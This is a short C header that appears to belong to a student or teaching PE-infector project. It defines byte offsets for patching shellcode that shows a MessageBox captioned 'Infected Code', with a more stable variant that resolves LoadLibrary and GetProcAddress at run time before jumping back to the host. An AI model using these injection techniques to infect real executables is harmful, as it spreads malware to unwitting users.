#define CAPTION_ "Infected Code"
#define TEXT_ "17520074 - 17520467"

void code();
void endCode();

/*
 * Example for get position of important instructions:
 *      assembly :  movl   $0x40a0f4,-0xc(%ebp)
 *      shellcode:  c7 45 f4 f4 a0 40 00
 *      Position of this shellcode in function is +6
 *  ==> Position of setting the value 0x40a0f4 in above movl instruction is +6
 * So we will adjust a suitable value instead of 0x40a0f4 in my shellcode
 * .. at that position in order for it can be runable.
 */

#define POS_SET_CAP   6     // Position of set address of Caption
#define POS_SET_TEXT  13    // Position of set address of Text
#define POS_CALL      49    // Position of call messagebox instruction
#define POS_JMP       57    // Position of jmp instruction

void stableCode();
void endStableCode();

#define POS_SET_DLLNAME_STABLE        6     // Position of set address of dll name 
#define POS_CALL_LOAD_STABLE          19    // Position of call loadlibrary instruction
#define POS_SET_MESBOX_VERSION_STABLE 49    // Position of set MessageBox version  
#define POS_SET_CAP_STABLE            75    // Position of set address of Caption
#define POS_SET_TEXT_STABLE           82    // Position of set address of Text
#define POS_CALL_GET_PROC_STABLE      64    // Position of call getprocaddress instruction
#define POS_JMP_STABLE                129   // Position of jmp instruction
